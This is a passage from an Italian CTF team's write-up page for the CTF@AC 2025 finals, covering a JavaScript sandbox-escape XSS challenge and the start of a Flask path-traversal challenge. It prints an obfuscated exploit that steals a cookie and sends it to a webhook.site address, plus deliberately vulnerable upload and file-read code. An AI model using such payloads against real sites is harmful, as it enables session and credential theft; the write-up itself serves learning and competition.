  "dateModified": "2025-11-09T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Paolo"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://pascalctf.github.io/it/ctf/ctfatac2025_finals/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Paolo",
    "logo": {
      "@type": "ImageObject",
      "url": "https://pascalctf.github.io/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://pascalctf.github.io/it/" accesskey="h" title="Home (Alt + H)">
                <img src="https://pascalctf.github.io/favicon.ico" alt="" aria-label="logo"
                    height="35">Home</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
                <ul class="lang-switch"><li>|</li>
                    <li>
                        <a href="https://pascalctf.github.io/en/" title="üá¨üáß En"
                            aria-label=":uk: En">üá¨üáß En</a>
                    </li>
                </ul>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://pascalctf.github.io/it/projects/" title="üìí Progetti">
                    <span>üìí Progetti</span>
                </a>
            </li>
            <li>
                <a href="https://pascalctf.github.io/it/ctf/" title="‚öô Writeups">
                    <span>‚öô Writeups</span>
                </a>
            </li>
            <li>
                <a href="https://pascalctf.github.io/it/competitions/" title="üèÜ Competizioni">
                    <span>üèÜ Competizioni</span>
                </a>
            </li>
            <li>
                <a href="https://pascalctf.github.io/it/sponsors/" title="üöÄ Sponsors">
                    <span>üöÄ Sponsors</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://pascalctf.github.io/it/">Home</a>&nbsp;¬ª&nbsp;<a href="https://pascalctf.github.io/it/ctf/">Capture The Flag üö©</a></div>
    <h1 class="post-title entry-hint-parent">
      Finali CTF@AC 2025
    </h1>
    <div class="post-description">
      Tutti i writeup della finale di CTF@AC, edizione 2025.
    </div>
    <div class="post-meta"><span title='2025-11-09 00:00:00 +0000 UTC'>novembre 9, 2025</span>&nbsp;¬∑&nbsp;46 minuti&nbsp;¬∑&nbsp;9794 parole&nbsp;¬∑&nbsp;Paolo&nbsp;|&nbsp;Traduzioni:
<ul class="i18n_list">
    <li>
        <a href="https://pascalctf.github.io/en/ctf/ctfatac2025_finals/">üá¨üáß En</a>
    </li>
</ul>&nbsp;|&nbsp;<a href="https://github.com/PascalCTF/PascalCTF.github.io/blob/main/content/en/ctf/ctfatac2025_finals.md" rel="noopener noreferrer edit" target="_blank">Suggerisci modifiche</a>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Indice contenuti</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#web-">Web üåê</a>
      <ul>
        <li><a href="#silicon-dioxide">Silicon Dioxide</a></li>
        <li><a href="#retro-forum">Retro Forum</a></li>
        <li><a href="#not-wordle">Not wordle</a></li>
        <li><a href="#lolchat2">lolchat2</a></li>
      </ul>
    </li>
    <li><a href="#exploitation-binaria-">Exploitation binaria üè¥‚Äç‚ò†Ô∏è</a>
      <ul>
        <li><a href="#baby-ikea">baby-ikea</a></li>
        <li><a href="#tetrastack">Tetrastack</a></li>
        <li><a href="#mini-e8">mini-e8</a></li>
      </ul>
    </li>
    <li><a href="#crittografia-">Crittografia üîë</a>
      <ul>
        <li><a href="#sparse-hills">Sparse Hills</a></li>
        <li><a href="#black-prince">Black prince</a></li>
        <li><a href="#rule-of-x">Rule of X</a></li>
      </ul>
    </li>
    <li><a href="#varie-">Varie üêß</a>
      <ul>
        <li><a href="#full-house-poker">Full-House Poker</a></li>
        <li><a href="#grass-guesser">Grass-Guesser</a></li>
        <li><a href="#discord-sanity-check">Discord Sanity Check</a></li>
        <li><a href="#stairway-to-heaven">Stairway To Heaven</a></li>
        <li><a href="#love-at-first-bit">Love at first bit</a></li>
      </ul>
    </li>
    <li><a href="#reverse-engineering-">Reverse engineering ‚öôÔ∏è</a>
      <ul>
        <li><a href="#minecrafty-as-a-service">Minecrafty as a Service</a></li>
        <li><a href="#volatile">Volatile</a></li>
        <li><a href="#ironveil">IronVeil</a></li>
      </ul>
    </li>
    <li><a href="#hardware-">Hardware üîå</a>
      <ul>
        <li><a href="#arducan">Arducan</a></li>
        <li><a href="#baby-board">Baby Board</a></li>
      </ul>
    </li>
    <li><a href="#forensics-">Forensics ü§ñ</a>
      <ul>
        <li><a href="#fire-and-ice">Fire and Ice</a></li>
      </ul>
    </li>
    <li><a href="#osint-">OSINT üåè</a>
      <ul>
        <li><a href="#fangs-overseas">Fangs overseas</a></li>
      </ul>
    </li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><hr>
<h1 id="finali-ctfac-2025">Finali CTF@AC 2025<a hidden class="anchor" aria-hidden="true" href="#finali-ctfac-2025">#</a></h1>
<p><img alt="logo ctf at ac" loading="lazy" src="/images/ctf@ac.png"></p>
<p>Abbiamo (Paolo) partecipato a questo CTF a Timi»ôoara da <strong>ven 07 nov. 2025, 16:00 CET</strong> a <strong>dom 09 nov. 2025, 10:00 CET</strong>, arrivando secondi assoluti ü•≥.</p>
<p>Anche se era la nostra prima esperienza CTF in un contesto internazionale, ci siamo davvero divertiti a risolvere queste challenge.</p>
<p>I componenti del team che hanno partecipato:</p>
<ul>
<li><strong>Marco Balducci</strong>    (<a href="https://github.com/Mark-74"><code>@Cryingfreeman74</code></a>)</li>
<li><strong>Alan Davide Bovo</strong>  (<a href="https://github.com/AlBovo"><code>@Hecker404</code></a>)</li>
<li><strong>Enea Maroncelli</strong>   (<a href="https://github.com/eneamaroncelli27"><code>@Zazaman</code></a>)</li>
</ul>
<h2 id="web-">Web üåê<a hidden class="anchor" aria-hidden="true" href="#web-">#</a></h2>
<h3 id="silicon-dioxide">Silicon Dioxide<a hidden class="anchor" aria-hidden="true" href="#silicon-dioxide">#</a></h3>
<h4 id="analisi">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi">#</a></h4>
<p>Questa challenge forniva il codice sorgente di un‚Äôapplicazione web Node.js progettata per scrivere e condividere codice JavaScript ‚Äúsandboxato‚Äù per modificare un canvas. C‚Äôerano sia un frontend sia un backend che gestivano l‚Äôesecuzione del JavaScript.</p>
<h5 id="frontend">Frontend<a hidden class="anchor" aria-hidden="true" href="#frontend">#</a></h5>
<p>Il frontend implementava un ambiente ‚Äúsandboxato‚Äù fatto in casa per eseguire il codice JavaScript come segue:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm"> * Super Duper Sandbox
</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">canvasSandbox</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kr">const</span> <span class="nx">sandboxFunc</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Function</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;canvas&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="sb">`
</span></span></span><span class="line"><span class="cl"><span class="sb">            const window = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const document = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const alert = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const console = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const eval = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const Function = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const setTimeout = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const setInterval = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const fetch = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const XMLHttpRequest = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const WebSocket = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const localStorage = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const sessionStorage = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const location = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const history = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const navigator = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const parent = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const top = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const self = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            const globalThis = undefined;
</span></span></span><span class="line"><span class="cl"><span class="sb">            canvas.constructor = null;
</span></span></span><span class="line"><span class="cl"><span class="sb">            canvas.__proto__.constructor = null;
</span></span></span><span class="line"><span class="cl"><span class="sb">            canvas.__proto__.__proto__.constructor = null;
</span></span></span><span class="line"><span class="cl"><span class="sb">            canvas.__proto__.__proto__.__proto__.constructor = null;
</span></span></span><span class="line"><span class="cl"><span class="sb">            canvas.__proto__.__proto__.__proto__.__proto__.constructor = null;
</span></span></span><span class="line"><span class="cl"><span class="sb">            canvas.__proto__.__proto__.__proto__.__proto__.__proto__.constructor = null;
</span></span></span><span class="line"><span class="cl"><span class="sb">            canvas.__proto__.__proto__.__proto__.__proto__.__proto__.__proto__.constructor = null;
</span></span></span><span class="line"><span class="cl"><span class="sb">            
</span></span></span><span class="line"><span class="cl"><span class="sb">            </span><span class="si">${</span><span class="nx">code</span><span class="si">}</span><span class="sb">
</span></span></span><span class="line"><span class="cl"><span class="sb">        `</span>
</span></span><span class="line"><span class="cl">        <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nx">sandboxFunc</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="kc">null</span><span class="p">,</span> <span class="nx">canvas</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;Sorry, your code did not run.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Forniva anche una funzione che eseguiva automaticamente qualsiasi codice JavaScript passato tramite il parametro di query <code>/?code=</code> all‚Äôinterno di questo ambiente sandboxato.</p>
<h5 id="backend">Backend<a hidden class="anchor" aria-hidden="true" href="#backend">#</a></h5>
<p>Il backend era responsabile della condivisione del codice e includeva un ulteriore livello di controlli:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">allowed_keywords</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;const&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ctx&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;canvas&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;getContext&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;console&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;let&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;vx&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;vy&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;radius&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;function&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;update&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;clearRect&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;width&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;height&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;if&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;beginPath&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;arc&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Math&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;PI&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;fillStyle&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;orange&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;fill&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;requestAnimationFrame&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">checkCode</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">matches</span> <span class="o">=</span> <span class="nx">code</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/[A-Za-z]{2,}/g</span><span class="p">)</span> <span class="o">||</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">disallowed</span> <span class="o">=</span> <span class="nx">matches</span><span class="p">.</span><span class="nx">filter</span><span class="p">((</span><span class="nx">k</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="o">!</span><span class="nx">allowed_keywords</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="nx">k</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">disallowed</span><span class="p">.</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>L‚Äôendpoint <code>/share</code> funzionava cos√¨:</p>
<ul>
<li>Controllava la presenza di parole chiave non consentite nel codice.</li>
<li>Faceva eseguire il codice da un bot Chromium usando l‚Äôendpoint <code>/?code=</code>.</li>
</ul>
<p>Tuttavia, la vulnerabilit√† principale era nel cookie della flag ‚Äî era salvato con <code>httpOnly: false</code>, il che significa che un semplice XSS poteva rubarlo facilmente.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">context</span><span class="p">.</span><span class="nx">addCookies</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">name</span><span class="o">:</span> <span class="s2">&#34;flag&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">domain</span><span class="o">:</span> <span class="s2">&#34;localhost&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">path</span><span class="o">:</span> <span class="s2">&#34;/&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">value</span><span class="o">:</span> <span class="nx">FLAG</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">sameSite</span><span class="o">:</span> <span class="s2">&#34;Lax&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">secure</span><span class="o">:</span> <span class="kc">false</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">httpOnly</span><span class="o">:</span> <span class="kc">false</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">]);</span>
</span></span></code></pre></div><h4 id="soluzione">Soluzione<a hidden class="anchor" aria-hidden="true" href="#soluzione">#</a></h4>
<p>Dopo aver analizzato l‚Äôintera challenge, trovare una soluzione funzionante √® stato semplice. Il controllo delle parole chiave del backend poteva essere bypassato usando la codifica UTF-8 (aggirando la regex <code>[A-Za-z]{2,}</code>). Poi, il frontend poteva essere sfruttato usando la parola chiave <code>this</code>.</p>
<p>Il frontend rimuoveva solo i riferimenti <em>diretti</em> alla maggior parte delle funzioni JavaScript, ma non sanitizzava correttamente gli accessi tramite il vero contesto <code>window</code> o <code>document</code>.</p>
<p>Una volta capito questo, abbiamo scritto un exploit completamente funzionante che esfiltrava il cookie dell‚Äôadmin usando una richiesta <code>fetch</code> verso il nostro webhook.</p>
<h4 id="exploit">Exploit<a hidden class="anchor" aria-hidden="true" href="#exploit">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">ctx</span> <span class="o">=</span> <span class="nx">canvas</span><span class="p">.</span><span class="nx">getContext</span><span class="p">(</span><span class="s1">&#39;2d&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">p</span> <span class="o">=</span> <span class="nx">ctx</span><span class="p">[</span><span class="s1">&#39;\u005f\u005f\u0070\u0072\u006f\u0074\u006f\u005f\u005f&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">p</span><span class="p">[</span><span class="s1">&#39;\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">c</span><span class="p">[</span><span class="s1">&#39;\u0063\u006f\u006e\u0073\u0074\u0072\u0075\u0063\u0074\u006f\u0072&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">g</span> <span class="o">=</span> <span class="nx">f</span><span class="p">(</span><span class="s1">&#39;\u0072\u0065\u0074\u0075\u0072\u006e\u0020\u0074\u0068\u0069\u0073&#39;</span><span class="p">)();</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">g</span><span class="p">[</span><span class="s1">&#39;\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">d</span><span class="p">[</span><span class="s1">&#39;\u0063\u006f\u006f\u006b\u0069\u0065&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">g</span><span class="p">[</span><span class="s1">&#39;\u0065\u006e\u0063\u006f\u0064\u0065\u0055\u0052\u0049\u0043\u006f\u006d\u0070\u006f\u006e\u0065\u006e\u0074&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">h</span> <span class="o">=</span> <span class="nx">g</span><span class="p">[</span><span class="s1">&#39;\u0066\u0065\u0074\u0063\u0068&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">u</span> <span class="o">=</span> <span class="nx">e</span><span class="p">(</span><span class="nx">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">h</span><span class="p">(</span><span class="s1">&#39;\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0077\u0065\u0062\u0068\u006f\u006f\u006b\u002e\u0073\u0069\u0074\u0065\u002f\u0035\u0063\u0035\u0038\u0037\u0066\u0037\u0061\u002d\u0031\u0063\u0030\u0030\u002d\u0034\u0035\u0038\u0032\u002d\u0061\u0035\u0062\u0033\u002d\u0031\u0061\u0030\u0038\u0064\u0065\u0032\u0031\u0032\u0033\u0061\u0062\u003f\u0064\u003d&#39;</span> <span class="o">+</span> <span class="nx">u</span><span class="p">);</span>
</span></span></code></pre></div><p>Una volta eseguito, la flag appariva nei log del webhook come:</p>
<p><code>d=flag=CTF{c0d2d75449e3167001cbb38b891a78c8168c165d2cbd48f8f7b3123759963f66}</code></p>
<h3 id="retro-forum">Retro Forum<a hidden class="anchor" aria-hidden="true" href="#retro-forum">#</a></h3>
<h4 id="analisi-1">Analisi<a hidden class="anchor" aria-hidden="true" href="#analisi-1">#</a></h4>
<p>Retro Forum era una piattaforma di post/chat dove gli utenti potevano condividere pensieri e gli amministratori moderarli.</p>
<p>Il sorgente mostrava come era strutturato e dove era salvato il database SQLite, oltre alla vulnerabilit√† principale in questa route:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/edit_profile&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">edit_profile</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;user_id&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">session</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span> <span class="o">=</span> <span class="n">get_db</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">new_bio</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="p">[</span><span class="s1">&#39;bio&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">filename</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;profile_pic&#39;</span> <span class="ow">in</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">file</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">files</span><span class="p">[</span><span class="s1">&#39;profile_pic&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">file</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">filename</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">filename</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="n">file</span><span class="o">.</span><span class="n">save</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;UPLOAD_FOLDER&#39;</span><span class="p">],</span> <span class="n">filename</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;UPDATE users SET profile_pic=? WHERE id=?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">        <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;UPDATE users SET bio=? WHERE id=?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">new_bio</span><span class="p">,</span> <span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">commit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;profile&#39;</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">]))</span>
</span></span><span class="line"><span class="cl">    <span class="n">c</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s2">&#34;SELECT bio, profile_pic FROM users WHERE id=?&#34;</span><span class="p">,</span> <span class="p">(</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;user_id&#39;</span><span class="p">],))</span>
</span></span><span class="line"><span class="cl">    <span class="n">bio</span><span class="p">,</span> <span class="n">pic</span> <span class="o">=</span> <span class="n">c</span><span class="o">.</span><span class="n">fetchone</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;edit_profile.html&#39;</span><span class="p">,</span> <span class="n">bio</span><span class="o">=</span><span class="n">bio</span><span class="p">,</span> <span class="n">pic</span><span class="o">=</span><span class="n">pic</span><span class="p">)</span>
</span></span></code></pre></div><p>Qui l‚Äôimmagine caricata dall‚Äôutente veniva salvata <strong>senza alcuna sanitizzazione o validazione</strong>, lasciando la piattaforma vulnerabile a un attacco di <strong>path traversal</strong>, che permetteva all‚Äôutente di sovrascrivere qualsiasi file con l‚Äôimmagine caricata.</p>
<p>Prima della soluzione, √® importante notare l‚Äôesistenza dell‚Äôendpoint <code>debug_file</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/debug/&lt;filename&gt;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">debug_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;is_admin&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="n">url_for</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">file_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">(),</span> <span class="n">filename</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_path</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">content</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">content</span><span class="p">,</span> <span class="mi">200</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;text/plain&#39;</span><span class="p">}</span>
